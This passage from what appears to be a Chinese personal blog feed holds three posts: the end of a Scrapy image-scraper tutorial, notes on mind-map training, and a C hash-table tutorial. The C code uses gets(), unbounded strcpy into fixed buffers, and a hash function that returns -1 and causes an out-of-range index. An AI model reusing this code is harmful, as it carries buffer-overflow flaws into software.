        urls = response.xpath(&#39;//*[@id=&quot;content&quot;][1]/ul/li/a/@href&#39;).extract()
        titles = response.xpath(&#39;//*[@id=&quot;content&quot;][1]/ul/li/a/text()&#39;).extract()

        item = VmgirlsItem()
        item[&#39;theme_urls&#39;] = urls
        item[&#39;theme_titles&#39;] = titles
        yield item

        for url, title in zip(urls, titles):
            save_path = os.path.join(self.user_data_dir, title)
            if not os.path.isdir(save_path):
                os.makedirs(save_path)

            yield Request(url, meta={&#39;title&#39;: title}, callback=self.parse_page)

    def parse_page(self, response):
        &#39;&#39;&#39;Parse each page of girls&#39;&#39;&#39;
        urls = response.xpath(&#39;//*[@class=&quot;post-content&quot;]//img/@data-src&#39;).extract()
        item = VmgirlsImagesItem()
        item[&#39;image_urls&#39;] = urls
        item[&#39;title&#39;] = response.meta[&#39;title&#39;]
        yield item
</code></pre>
<h3 id="编写Pipeline"><a href="#编写Pipeline" class="headerlink" title="编写Pipeline"></a>编写Pipeline</h3><p>爬虫爬取的信息最终通过项目管道进行持久化处理或者完成相应的资源下载任务，从之前的配置文件我们也能知道，我们需要两个<code>pipeline</code>类，一个处理<code>VmgirlsItem</code>,另一个处理<code>VmgirlsImagesPipeline</code>，下面逐一介绍。</p>
<pre><code class="python">from scrapy.exporters import JsonLinesItemExporter
from scrapy.pipelines.images import ImagesPipeline
from scrapy.exceptions import DropItem
from scrapy.http import Request

from vmgirls.items import VmgirlsItem
from vmgirls.items import VmgirlsImagesItem

import os


class VmgirlsPipeline(object):
    &#39;&#39;&#39;Pipeline for every url of one theme, save theme info to json file&#39;&#39;&#39;
    def __init__(self, user_data_dir):
        &#39;&#39;&#39;Open file to save the exported Items&#39;&#39;&#39;
        self.user_data_dir = user_data_dir

        if not os.path.isdir(self.user_data_dir):
            os.makedirs(self.user_data_dir)

    @classmethod
    def from_crawler(cls, crawler):
        &#39;&#39;&#39;Get user dir from global settings.py&#39;&#39;&#39;
        settings = crawler.settings
        return cls(settings.get(&#39;USER_DATA_DIR&#39;))

    def process_item(self, item, spider):
        &#39;&#39;&#39;Save item info to loacl file&#39;&#39;&#39;
        if isinstance(item, VmgirlsItem):
            self.girls_info = open(
                os.path.join(self.user_data_dir, &#39;vmgirls.json&#39;), &#39;w+b&#39;)
            self.girls_exporter = JsonLinesItemExporter(
                self.girls_info, encoding=&#39;utf-8&#39;, indent=4)

            self.girls_exporter.start_exporting()

            for url, title in zip(item[&#39;theme_urls&#39;], item[&#39;theme_titles&#39;]):
                single_item = {&#39;theme_url&#39;:url, &#39;title&#39;:title}
                self.girls_exporter.export_item(single_item)

            self.girls_exporter.finish_exporting()
            self.girls_info.close()
        return item
</code></pre>
<p>第一个<code>pipeline</code>类将站点地图的信息以<code>json</code>格式存储到文件<code>vmgirls.json</code>中。这里用到了<code>JsonLinesItemExporter</code>,该类可以将一个个<code>dict</code>数据以单行形式转化成json格式。</p>
<pre><code class="python">class VmgirlsImagesPipeline(ImagesPipeline):
    &#39;&#39;&#39;Get images from one theme&#39;&#39;&#39;
    def get_media_requests(self, item, info):
        if isinstance(item, VmgirlsImagesItem):
            for image_url in item[&#39;image_urls&#39;]:
                yield Request(image_url, meta={&#39;item&#39;: item})

    def file_path(self, request, response=None, info=None):
        &#39;&#39;&#39;Set image dir to IMAGES_STORE/title/base_url&#39;&#39;&#39;
        url = request.url
        item = request.meta[&#39;item&#39;]
        path = os.path.join(item[&#39;title&#39;], url.split(&#39;/&#39;)[-1])
        return path

    def item_completed(self, results, item, info):
        if isinstance(item, VmgirlsImagesItem):
            image_paths = [x[&#39;path&#39;] for ok, x in results if ok]

            if not image_paths:
                raise DropItem(&quot;Item contains no images&quot;)
            return item
</code></pre>
<p>第二个<code>pipeline</code>类继承于<code>ImagesPipeline</code>，这是一个专门用于图片下载的管道类，配置文件中的<code>IMAGES_STORE</code>正是用于指定该类下载图片后的存放路径。</p>
<p>我们这里重写了三个函数：</p>
<ol>
<li><code>get_media_requests</code> 获取某主题页面的所有图片链接，使用<code>Request</code>进行下载</li>
<li><code>file_path</code> 为了将不同主题的图片存储在不同的文件夹，需要修改存储路径</li>
<li><code>item_completed</code> 当图片下载完成后，进入该函数，如果没有下载到图片则提示该<code>Item</code>不包含图片</li>
</ol>
<p>可以注意到，两个管道类在处理<code>item</code>前都有通过<code>isinstance</code>函数判断当前的<code>pipeline</code>属于哪个类的实例，这是为了保证一个管道类只处理对应的管道数据。因为默认情况下，爬虫提交出来的所有<code>item</code>都会根据<code>pipeline</code>的优先级依次经过两个管道，但我们实际只需要每个<code>item</code>经过对应的管道即可，所以使用<code>isinstance</code>进行判断是非常有必要的，既可以提高处理效率，又可以避免过多无效log对调试过程产生的干扰。</p>
<h2 id="爬取结果"><a href="#爬取结果" class="headerlink" title="爬取结果"></a>爬取结果</h2><p>为了方便爬取，可以使用以下的代码段作为爬虫的入口。</p>
<pre><code class="python">from scrapy import cmdline
cmdline.execute(&#39;scrapy crawl vmgirl&#39;.split())
</code></pre>
<p>执行后可以看到爬虫到的图片数据如下：</p>
<p><img src="/assets/vmgirls/pictures.png" alt="capture result"></p>
<p>代码已托管至开源项目<a href="https://github.com/Litreily/capturer" target="_blank" rel="noopener">litreily/capturer</a>, 欢迎Star和交流。</p>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spider </tag>
            
            <tag> girls </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[高效思维导图应用训练]]></title>
      <url>https://www.litreily.top/2019/06/11/mind-map/</url>
      <content type="html"><![CDATA[<p>上周在公司进行了一天的思维导图培训，感觉收获颇丰，有必要总结一下。</p>
<h2 id="思维导图概述"><a href="#思维导图概述" class="headerlink" title="思维导图概述"></a>思维导图概述</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>思维导图主要用于解决以下三个问题：</p>
<ol>
<li>记不住</li>
<li>理不清</li>
<li>想不出</li>
</ol>
<p>这三个也是工作效能低下的主要原因。那究竟什么是思维导图呢？</p>
<blockquote>
<p><strong>思维导图</strong>是表达<strong>放射性思维</strong>的图形思维工具。用<strong>图文</strong>技巧，把各级主题关系用层级图表现，将关键词与图像、颜色等建立思维链接。用<strong>全脑机能</strong>，使在科学与艺术、逻辑与想象间平衡，开启大脑潜能。</p>
</blockquote>
<a id="more"></a>
<p><strong>思维导图</strong>包含以下6大要素，其中，中心主题直接决定思维导图的内容。所谓<strong>左逻右艺</strong>，左脑负责逻辑思维，右脑负责艺术想象。下面的1、2、6由左脑负责，3、4、5由右脑负责，<strong>关系</strong>的本质是<strong>内在逻辑</strong>。</p>
<p><img src="/assets/mindmap/element.png" alt="six element"></p>
<p>那我们如何判断一个图是否是思维导图呢？可以根据以下两点：</p>
<ol>
<li>图形是否发散</li>
<li>是否具备必不可少的三个要素（上图中的1、2、3）</li>
</ol>
<h3 id="由来"><a href="#由来" class="headerlink" title="由来"></a>由来</h3><p>接下来简单了解下思维导图的由来。思维导图由英国托尼-博赞<strong>Tony Buzan</strong>先生发明，他是受名人笔记（包括达尔文、达芬奇和爱因斯坦的笔记，他们的笔记都是图文形式而且呈发散状）和神经元细胞外形的启发。这些图形的特点是：</p>
<blockquote>
<p>一中心多枝条，枝条绕中心画，主干粗分支细，条条连不分家</p>
</blockquote>
<p><img src="/assets/mindmap/neure.jpg" alt="neure cell"></p>
<h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>思维导图可应用于生活、工作和学习的方方面面，下图是根据培训资料绘制的一个demo。</p>
<p><img src="/assets/mindmap/application.png" alt="application"></p>
<p>总的来说，包含<strong>记理析创</strong>四个作用：</p>
<ul>
<li><strong>记</strong> - 帮助记忆</li>
<li><strong>理</strong> - 帮助理清思路</li>
<li><strong>析</strong> - 帮助分析问题</li>
<li><strong>创</strong> - 帮助创新，开拓思维</li>
</ul>
<p>高效记忆的方法是<strong>联想</strong>和<strong>联系</strong>，培训课上老师给我们做了个游戏，每个组给出随意两个两位数，7个组共28个数字。老师通过对每个两位数进行编码，通过谐音词去替换，比如36对应三鹿奶粉，87对应白旗，63对应硫酸等等，然后将这些词编成一个故事，越离谱越好，结果真的记住了，而且没有特别复习，倒背如流。这也确实说明大脑对图像，或者画面的记忆更深刻。而思维导图之所以功能强大，就是因为它能达到一种<strong>图导思维</strong>的效果，通过大脑容易记忆的图形引导和开拓思维。</p>
<h2 id="思维导图的读与绘"><a href="#思维导图的读与绘" class="headerlink" title="思维导图的读与绘"></a>思维导图的读与绘</h2><p>了解了什么是思维导图，以及导图的应用，下面便来说明导图的阅读与绘制。在此之前，先明确一点，思维导图根据图文样式分为<strong>全图</strong>、<strong>全文</strong>和<strong>图文</strong>三类，其中全图的可读性最差，图文的可读性最强。</p>
<h3 id="读懂导图"><a href="#读懂导图" class="headerlink" title="读懂导图"></a>读懂导图</h3><p>读懂思维导图，分以下4个步骤：</p>
<p><img src="/assets/mindmap/read.png" alt="read"></p>
<p>从<strong>1点钟</strong>方向开始读主干，按<strong>顺时针</strong>方向阅读。</p>
<h3 id="绘制导图"><a href="#绘制导图" class="headerlink" title="绘制导图"></a>绘制导图</h3><p>绘制思维导图同样分为四步，先确定中心主题，然后逐一绘制主干部分，进而绘制支干，最后加上插图并着色修饰。</p>
<p><img src="/assets/mindmap/write.png" alt="write"></p>
<p>此外，绘制导图需要遵循以下10个规则和技巧：</p>
<ol>
<li>大脑偏好图形</li>
<li>大脑偏好彩色</li>
<li>同支同色（同一分支同一颜色）</li>
<li>大脑喜欢弯的，即引导线要是曲线</li>
<li>引导线由粗到细</li>
<li>由点发散</li>
<li>字在线上</li>
<li>字线等长（字在线中间）</li>
<li>用词而不同句子或短语</li>
<li>纸要横放（A4纸）</li>
</ol>
<p>这些规则可以指导我们绘制思维导图，但具体情况具体分析，比如很多思维导图软件绘制的引导线不一定是弯的。</p>
<h2 id="思维导图的职场应用"><a href="#思维导图的职场应用" class="headerlink" title="思维导图的职场应用"></a>思维导图的职场应用</h2><h3 id="记笔记"><a href="#记笔记" class="headerlink" title="记笔记"></a>记笔记</h3><p>在工作会议中，需要做笔记，此时如果使用传统笔记，会有以下弊病：</p>
<p><img src="/assets/mindmap/note_bad.png" alt="bad note"></p>
<p>相比之下，使用思维导图具有更多的优势：</p>
<p><img src="/assets/mindmap/note_mind.png" alt="mind note"></p>
<p>使用思维导图做笔记，讲究<strong>抓、画、修</strong>，和女生化妆有点类似。<strong>抓</strong>关键词，<strong>画</strong>思维导图，<strong>修</strong>导图细节。其中<strong>抓</strong>是最关键的一步，<strong>关键词</strong>是精简的核心信息，可唤醒记忆，能扩展思维。</p>
<p>对于<strong>关键词</strong>，我们可以从文章或会议的四个方面着手，分别是<strong>标题</strong>、<strong>中心句</strong>、<strong>高频词</strong>和<strong>转折后</strong>，而且关键词多半为名词、动词和形容词。抓取过程需掌握<strong>辨虚实</strong>、<strong>明大小</strong>、<strong>分主次</strong>，以便理清思路，明确关键词。</p>
<p>对于会议笔记，其第一主干应该是基本情况，包括时间、地点和人物；如果是多个人讲话，则应该一个人对应一个主干。同时要清楚的是，<strong>记笔记</strong>和<strong>做笔记</strong>是不一样的，区别如下：</p>
<ol>
<li>记是要复述、还原</li>
<li>做是要加工、提炼分析</li>
<li>从内容角度而言，记笔记有标准答案</li>
<li>工作中首选<strong>记笔记</strong></li>
</ol>
<h3 id="做计划"><a href="#做计划" class="headerlink" title="做计划"></a>做计划</h3><p>制定计划，设定目标可以参考管理学的<a href="https://baike.baidu.com/item/smart/2230883" target="_blank" rel="noopener">SMART</a>原则，具体的可以参考百度百科SMART词条，这里不予详述。</p>
<ul>
<li><strong>S</strong>pecific 具体的</li>
<li><strong>M</strong>easureable 可度量的</li>
<li><strong>A</strong>chievable 可实现的</li>
<li><strong>R</strong>elevant 相关性</li>
<li><strong>T</strong>ime-Based 有时限的</li>
</ul>
<p>制定计划分三部分，<strong>方案预案</strong>、<strong>核心要素</strong>和<strong>细节工作</strong></p>
<p><img src="/assets/mindmap/plan.png" alt="plan"></p>
<p>其中<strong>5W2H</strong>可以帮助我们理清思路，做好计划，那么制定一个完整计划，就可以大致按照下面的思维导图进行。</p>
<p><img src="/assets/mindmap/plan_full.png" alt="full plan"></p>
<h3 id="做总结"><a href="#做总结" class="headerlink" title="做总结"></a>做总结</h3><p>做工作总结包含以下6个目的：</p>
<p><img src="/assets/mindmap/summary.png" alt="summary"></p>
<ul>
<li>看进展 当前已完成及未完成的情况</li>
<li>寻经验 对高效工作、解决问题等有帮助的经验，表功</li>
<li>找问题 工作中遇到的问题</li>
<li>析原因 分析所找问题产生的原因</li>
<li>定方向 根据进展和问题制定后续工作方向</li>
<li>提建议 为了完成制定的目标，需要向领导索要的资源</li>
</ul>
<p>根据工作总结的目的，我们可以通过思维导图做出工作总结</p>
<p><img src="/assets/mindmap/summary_2.png" alt="summary 2"></p>
<p>上面这几个应用是职场经常能用到的，也是比较实用的技巧，培训过程中针对各个应用我们也都有实践操作，但是导图制作比较粗糙，就不放这了。</p>
<h2 id="思维拓展训练"><a href="#思维拓展训练" class="headerlink" title="思维拓展训练"></a>思维拓展训练</h2><p>以上一大堆的东西都是为了解决开头讲到的<strong>记不住</strong>的问题，下面来看看<strong>理不清</strong>和<strong>想不出</strong>这两个问题的解决方法。</p>
<h3 id="分类训练"><a href="#分类训练" class="headerlink" title="分类训练"></a>分类训练</h3><p><strong>理不清</strong>的问题，就是搞不清楚各个关键词之间的逻辑关系，不能很好的分清主次。那么分类训练就尤为必要了，把一堆看似杂乱的事物放到一起，对其进行分类，可以让我们理清思路。</p>
<p>而分类的关键是<strong>不重不漏</strong>，也就是不重复不遗漏，即<strong><a href="https://baike.baidu.com/item/MECE/7762637" target="_blank" rel="noopener">MECE</a></strong>（Mutually Exclusive, Collectively Exhaustive）,相互独立，完全穷尽。举个例子，将以下食物按照某种方式进行分类：</p>
<ul>
<li>葡萄、桔子、苹果、土豆、皮蛋、胡萝卜、鸡蛋、牛奶、酸奶</li>
</ul>
<p>有很多分类方式，按水果和非水果分：</p>
<ul>
<li>水果：葡萄、桔子、苹果</li>
<li>非水果：土豆、皮蛋、胡萝卜、鸡蛋、牛奶、酸奶</li>
</ul>
<p>按蛋奶类和非蛋奶类：</p>
<ul>
<li>蛋奶：皮蛋、鸡蛋、牛奶、酸奶</li>
<li>非蛋奶：葡萄、桔子、苹果、土豆、胡萝卜</li>
</ul>
<p>有人就说了，按蛋白质高低分类，那多少算是高蛋白、多少又算是低蛋白呢，如果没有量化就不好区分了。归根结底，分类的关键是<strong>不重不漏</strong>。</p>
<h3 id="联想训练"><a href="#联想训练" class="headerlink" title="联想训练"></a>联想训练</h3><p>解决了<strong>理不清</strong>的问题，接下来就剩<strong>想不出</strong>了，脑子卡壳想不出东西，老师总结的一句话</p>
<blockquote>
<p><strong>先开花后接龙</strong></p>
<p><strong>开花</strong>：想法都从主题开始联想，从一到多，即发散思维，可扩展思维的<strong>广度</strong>和<strong>宽度</strong></p>
<p><strong>接龙</strong>：每一个想法都是从前一个想法联想出来的，类似成语接龙，可扩展思维的<strong>深度</strong>和<strong>精度</strong></p>
</blockquote>
<p>为了开花接龙，老师讲了三个重要技巧：</p>
<ol>
<li>从正反面、内外部、相近方向联想</li>
<li>从五感（视听触嗅味）着实联想</li>
<li>5W2H联想</li>
</ol>
<p>之后老师通过一个例子帮助加深印象，针对<strong>党员活动</strong>这个主题，发散思维想点子。首先从关联性，包括相反的、相近的、相关的、内部的、外部的、相通的等方面联想：</p>
<p><img src="/assets/mindmap/related.jpg" alt="related"></p>
<p>从五感联想：</p>
<p><img src="/assets/mindmap/feeling.png" alt="feeling"></p>
<p>从5W2H联想：</p>
<p><img src="/assets/mindmap/5w2h.png" alt="5w2h"></p>
<p>之后老师让我们依据这种方法对<strong>降本增效</strong>这个主题进行头脑风暴，发散思维，可惜当时没拍照。。。联想训练就是先从广度发散、再从深度递进的过程，这可以帮助我们快速想出好的点子。</p>
<h2 id="思维导图软件"><a href="#思维导图软件" class="headerlink" title="思维导图软件"></a>思维导图软件</h2><p>最后老师给我们推荐了几款常见的思维导图软件，然而这些个我之前都已经了解了，也用过一些，下面的<code>MindManager</code>和<code>iMindMap</code>是收费的，<code>MindManger</code>更适合工作中用，<code>iMindMap</code>是完全按照托尼博赞先生的规则研发的。然而我一般使用<code>ubuntu</code>作为常用操作系统，所以更喜欢百度脑图这款在线思维导图软件。</p>
<ul>
<li>Xmind（小妹）</li>
<li>MindManager（美眉）</li>
<li>iMindMap（爱美眉）</li>
<li><a href="http://naotu.baidu.com" target="_blank" rel="noopener">百度脑图</a></li>
</ul>
<p>那几个后缀是培训老师教的。。。好记！本文的几个思维导图是通过百度脑图绘制的。然而老师建议在使用软件之前，最少手绘<strong>21</strong>个思维导图，不要问为什么是这个数，我也不知道，我也没敢问。就像机械手表的广告中都是10点10分一样，没有为什么，就是好看。。。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在培训之前，我已经用过一段时间的思维导图了，主要用于梳理代码逻辑和制定项目计划。本次培训加深了对思维导图的理解，规范了导图的绘制和读图技巧，修正了几个之前绘图时没太注意的问题，同时也知晓了导图用途之广、功能之强！的确值得学习和应用。</p>
<p>此外，也扩展几个知识点，如基于MECE原则的分类方法、基于SMART的目标制定、左逻右艺的大脑分工、先开花后接龙的思维发散技巧等。在以后的生活、学习和工作中，相信通过思维导图可以提高各方面的办事效率，节约时间。最后，希望看到这份总结的有缘人也能有所收获。</p>
<h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><p>下面是我写这篇文章之前绘制的大纲，也是一张思维导图，帮我理清写作方向和思路。</p>
<p><img src="/assets/mindmap/summary.jpeg" alt="summary"></p>
<h3 id="老师推荐书籍"><a href="#老师推荐书籍" class="headerlink" title="老师推荐书籍"></a>老师推荐书籍</h3><ul>
<li>《结构性思维》</li>
<li>《金字塔原理》</li>
</ul>
]]></content>
      
        <categories>
            
            <category> Tools </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 5W2H </tag>
            
            <tag> MECE </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[哈希表的实现与常见操作]]></title>
      <url>https://www.litreily.top/2019/05/24/hash-table/</url>
      <content type="html"><![CDATA[<p>前段时间基于数组和单链表以拉链法写了个哈希表，实现了基本的增删改查（<code>CRUD</code>），以键值对的形式存储一些配置参数，便以此文记录一下。</p>
<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><pre><code class="c">#define TABLE_SIZE 101
#define KEY_SIZE 32
#define VALUE_SIZE 128
#define BUF_SIZE 256

#define DATA_PATH &quot;data.txt&quot;

struct linklist {
    char key[KEY_SIZE];
    char val[VALUE_SIZE];
    struct linklist *next;
};
struct linklist *hashtbl[TABLE_SIZE];
</code></pre>
<a id="more"></a>
<p>简单起见，使用两个字符数组分别用于存储键<code>key</code>和值<code>value</code>,每个键值对都以单链表<code>linklist</code>的一个节点形式存储。哈希表<code>hashtbl</code>数组存储每个单链表的头部指针<code>head</code>。</p>
<p><img src="/assets/hash/hash_table.jpg" alt="hash table"></p>
<h2 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h2><p>对于字符串的哈希函数，我选择了《算法》第4版提供的一种叫 Horner 的经典算法，用 N 次乘法、加法和取余来计算一个字符串的散列值。注意书中的算法实现均采用<code>java</code>语言↓</p>
<pre><code class="java">hash = (R * hash + s.charAt(i)) % M;
</code></pre>
<p>其中，R是一个素数，只要其足够小，就能保证hash在（0～M-1）之内。这里设R为31，M即哈希表的长度，下面就是根据以上算法实现的一个字符串哈希函数。</p>
<pre><code class="c">/* calc hash code of string */
uint32_t hash(char *key) {
    int len = strlen(key);
    int i;
    uint32_t ret = 0;

    if(!len)
        return -1;

    for(i=0; i &lt; len; i++) {
        ret = (ret * 31 + (uint32_t)key[i]) % TABLE_SIZE;
    }

    return ret;
}
</code></pre>
<p>字符串的哈希函数还有很多，具体可以参考<a href="https://www.cnblogs.com/uvsjoh/archive/2012/03/27/2420120.html" target="_blank" rel="noopener">字符串哈希函数</a></p>
<h2 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h2><p>上面定义好了哈希表的存储方式，以及字符串的哈希函数，下面便可以逐个实现对哈希表的增删改查。</p>
<h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p>首先实现哈希表元素的增添或更改:</p>
<ol>
<li>计算待插入或更新键的哈希值</li>
<li>遍历哈希值所在链表，判断当前键是否已存在</li>
<li>若键不存在，则在表头插入新键；若已存在，则更新键值</li>
</ol>
<p>插入新键时使用<code>malloc</code>分配内存，同时更新所在链表的表头</p>
<p><img src="/assets/hash/set_new_key.jpg" alt="set new key"></p>
<pre><code class="c">/* set or update value of key to hash table */
int set(char *key, char *val) {
    uint32_t i;
    struct linklist *l, *n;

    if(!key || !val)
        return -1;

    i = hash(key);

    for(l = hashtbl[i]; l &amp;&amp; strcmp(key, l-&gt;key); l = l-&gt;next);

    if(l)
        strcpy(l-&gt;val, val);
    else {
        n = malloc(sizeof(struct linklist));
        if(!n)
            return -1;

        strcpy(n-&gt;key, key);
        strcpy(n-&gt;val, val);

        /* insert new key to the head of linklist */
        n-&gt;next = hashtbl[i];
        hashtbl[i] = n;
    }

    return 0;
}
</code></pre>
<h3 id="unset"><a href="#unset" class="headerlink" title="unset"></a>unset</h3><p>对键的删除其实就是对一块内存的释放，先计算哈希值，遍历链表找到待删除的键，最后<code>free</code>即可。</p>
<p><img src="/assets/hash/unset_key.jpg" alt="unset key"></p>
<p>这里需要考虑的一个问题是如果待删除键值对<code>l</code>是表头后第一个节点，需要将链表表头指针直接指向<code>l-&gt;next</code>。</p>
<pre><code class="c">/* remove key from hash table */
int unset(char *key) {
    uint32_t i;
    struct linklist *l, *prev;

    if(!key)
        return -1;

    i = hash(key);

    for(prev = hashtbl[i], l = prev; l &amp;&amp; strcmp(key, l-&gt;key); prev = l, l = l-&gt;next);

    if(l) {
        if (l == prev)
            hashtbl[i] = l-&gt;next;
        else
            prev-&gt;next = l-&gt;next;
        free(l);
    }

    return 0;
}
</code></pre>
<h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><p>获取键值就非常简单了，计算哈希值后直接遍历链表即可。</p>
<pre><code class="c">/* get value of key from hash table */
char* get(char *key) {
    uint32_t i;
    struct linklist * l;

    if(!key)
        return NULL;

    i = hash(key);

    for(l = hashtbl[i]; l &amp;&amp; strcmp(key, l-&gt;key); l = l-&gt;next);

    return l ? l-&gt;val : NULL;
}
</code></pre>
<h2 id="其它操作"><a href="#其它操作" class="headerlink" title="其它操作"></a>其它操作</h2><h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><p><code>show</code>函数用于显示哈希表当前存储的所有数据，实现方法即循环遍历哈希表，然后打印出每个链表节点存储的键值对。每行打印一组键值对，并且键值对之前会打印出当前键对应的哈希函数计算结果。</p>
<pre><code class="c">/* show all the keys &amp; values of hash table */
void show() {
    int i;
    struct linklist *l;

    __nprintf(&quot;---------------------------------------&quot;);
    for(i = 0; i &lt; TABLE_SIZE; i++)
        for(l = hashtbl[i]; l != NULL; l = l-&gt;next)
            __nprintf(&quot;%d\t%s=\&quot;%s\&quot;&quot;, hash(l-&gt;key), l-&gt;key, l-&gt;val);
    __nprintf(&quot;---------------------------------------&quot;);
}
</code></pre>
<p>函数中用到的<code>__nprintf</code>函数如下，是通过向终端<code>/dev/tty</code>写入数据完成对数据的终端显示，注意不同操作系统的终端设备路径可能不太一样，例如嵌入式Linux系统可能使用的是<code>dev/console</code>.</p>
<pre><code class="c">/* use this &#39;__nprintf&#39; to print message */
void __nprintf(const char *fmt, ...) {
    va_list ap;
    static FILE *filp;

    if ((filp == NULL) &amp;&amp; (filp = fopen(&quot;/dev/tty&quot;, &quot;a&quot;)) == NULL)
        return;

    va_start(ap, fmt);
    vfprintf(filp, fmt, ap);
    fputs(&quot;\n&quot;, filp);
    va_end(ap);
}
</code></pre>
<h3 id="commit"><a href="#commit" class="headerlink" title="commit"></a>commit</h3><p>除了将数据显示在终端外，还可以通过下面的<code>commit</code>函数将数据存入文件当中，该文件就可以充当最简易的数据库。</p>
<pre><code class="c">/* save all keys &amp; values from memory to local file */
int commit() {
    int i;
    struct linklist *l;
    char buf[BUF_SIZE];
    FILE *fp;

    fp = fopen(DATA_PATH, &quot;w&quot;);

    if(!fp)
        return -1;

    for(i = 0; i &lt; TABLE_SIZE; i++) {
        for(l = hashtbl[i]; l != NULL; l = l-&gt;next) {
            snprintf(buf, BUF_SIZE, &quot;%s=\&quot;%s\&quot;\n&quot;, l-&gt;key, l-&gt;val);
            fputs(buf, fp);
        }
    }

    fclose(fp);
    return 0;
}
</code></pre>
<h3 id="load"><a href="#load" class="headerlink" title="load"></a>load</h3><p>既然上面提到了数据存储，那自然就少不了数据读取，将存入文件的数据加载到内存当中，作为进程启动的首个任务，这便是<code>load</code>函数所完成的工作。</p>
<pre><code class="c">/* load keys &amp; values from local file to memory */
int load() {
    int i;
    struct linklist *l;
    char buf[BUF_SIZE]={0};
    char *key, *val;
    FILE *fp;

    fp = fopen(DATA_PATH, &quot;r&quot;);

    if(!fp)
        return -1;

    while(fgets(buf, BUF_SIZE, fp)) {
        key = strtok(buf, &quot;=&quot;);
        val = strtok(NULL, &quot;\&quot;\n&quot;);
        set(key, val);
    }

    fclose(fp);
    return 0;
}
</code></pre>
<p>至此，与哈希表的基本操作函数都已实现，下面将使用这些基本函数实现对哈希表的一些常见操作↓</p>
<h2 id="应用实例"><a href="#应用实例" class="headerlink" title="应用实例"></a>应用实例</h2><h3 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h3><p>下面实现一个<code>hash</code>程序，对哈希表进行交互式操作，程序主要内容如下：</p>
<ol>
<li>启动时加载存储文件中的数据到哈希表</li>
<li>从终端不断获取用户指令，完成数据的增删改查与存储，以及程序的帮助信息及退出</li>
</ol>
<pre><code class="c">#include &quot;hash.h&quot;

static void help() {
    __nprintf(&quot;  help \t\t--show this infomation\n&quot; \
          &quot;  set key val \t--set or update value of key\n&quot; \
          &quot;  unset key \t--remove key from hash table\n&quot; \
          &quot;  get key \t--show value of key\n&quot; \
          &quot;  show \t\t--show all keys &amp; values of hash table\n&quot; \
          &quot;  commit \t--write all keys &amp; values to local file\n&quot; \
          &quot;  exit \t\t--exit current session&quot;
          );
}

int main(int argc, char *argv[]) {
    char cmd[128]={0};
    char *action, *key, *val;

    load();
    while(1) {
        printf(&quot;CMD&gt; &quot;);
        gets(cmd);

        key = NULL;
        val = NULL;

        action = strtok(cmd, &quot; &quot;);
        if(!action)
            continue;

        if(!strcmp(action, &quot;set&quot;)) {
            key = strtok(NULL, &quot; &quot;);
            val = strtok(NULL, &quot;\n&quot;);
            set(key, val);
        }
               else if (!strcmp(action, &quot;unset&quot;)) {
            key = strtok(NULL, &quot; &quot;);
            unset(key);
        }
        else if (!strcmp(action, &quot;get&quot;)) {
            key = strtok(NULL, &quot; &quot;);
            val = get(key);
            if(val)
                __nprintf(&quot;%s=\&quot;%s\&quot;&quot;, key, val);
        }
        else if (!strcmp(action, &quot;show&quot;))
            show();
        else if (!strcmp(action, &quot;commit&quot;))
            commit();
        else if (!strcmp(action, &quot;help&quot;))
            help();
        else if (!strcmp(action, &quot;exit&quot;)) {
            commit();
            break;
        }
        else {
            __nprintf(&quot;unknown cmd, try help!&quot;);
            continue;
        }
    }
}
</code></pre>
<p>编译后应用示例如下：</p>
<pre><code class="bash">➜  hash git:(master) ./hash
CMD&gt; help
  help          --show this infomation
  set key val   --set or update value of key
  unset key     --remove key from hash table
  get key       --show value of key
  show          --show all keys &amp; values of hash table
  commit        --write all keys &amp; values to local file
  exit          --exit current session
CMD&gt; set id 1234
CMD&gt; show
---------------------------------------
22      id=&quot;1234&quot;
---------------------------------------
CMD&gt; get id
id=&quot;1234&quot;
CMD&gt;
CMD&gt; set username litreily
CMD&gt; set password 123456
CMD&gt; show
---------------------------------------
22      id=&quot;1234&quot;
79      password=&quot;123456&quot;
88      username=&quot;litreily&quot;
---------------------------------------
CMD&gt; unset password
CMD&gt; show
---------------------------------------
22      id=&quot;1234&quot;
88      username=&quot;litreily&quot;
---------------------------------------
CMD&gt; commit
CMD&gt; exit
➜  hash git:(master)
</code></pre>
<h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><p>除了交互式程序<code>hash</code>外，我还写了一个测试用例，用于生成100组随机键值对，键值对由随机长度及字符组成，最终得到的哈希表将存入本地文件<code>data.txt</code>中。</p>
<pre><code class="c">#include &lt;time.h&gt;
#include &quot;hash.h&quot;

#define MAX_KEYS 1024
static const char * key_pool = &quot;abcdefghijklmnopqrstuvwxyz_&quot;;
static const char * val_pool = &quot;abcdefghijklmnopqrstuvwxyz_0123456789 .&quot;;

void set_rand_key() {
    int key_maxlen = strlen(key_pool);
    int val_maxlen = strlen(val_pool);
    char key[32] = {0};
    char val[128] = {0};
    int key_len, val_len, i;

    key_len = 1 + rand() % 16;
    val_len = 4 + rand() % 50;

    for(i = 0; i &lt; key_len; i++)
        key[i] = key_pool[rand() % key_maxlen];

    for(i = 0; i &lt; val_len; i++)
        val[i] = val_pool[rand() % val_maxlen];

    set(key, val);
}

int main(int argc, char *argv[]) {
    int i;
    int test_times = argc &gt; 1? atoi(argv[1]) : MAX_KEYS;

    srand((uint32_t)time(NULL));
    for(i = 0; i &lt; test_times; i++)
        set_rand_key();
    commit();

    show();

    return 0;
}
</code></pre>
<p>该测试用例也可以大致用来测试哈希函数的可靠性，只要看数据中每个键值对前面的哈希值是否均匀分布即可，实践证明是均匀分布的，这里不再给出测试过程。</p>
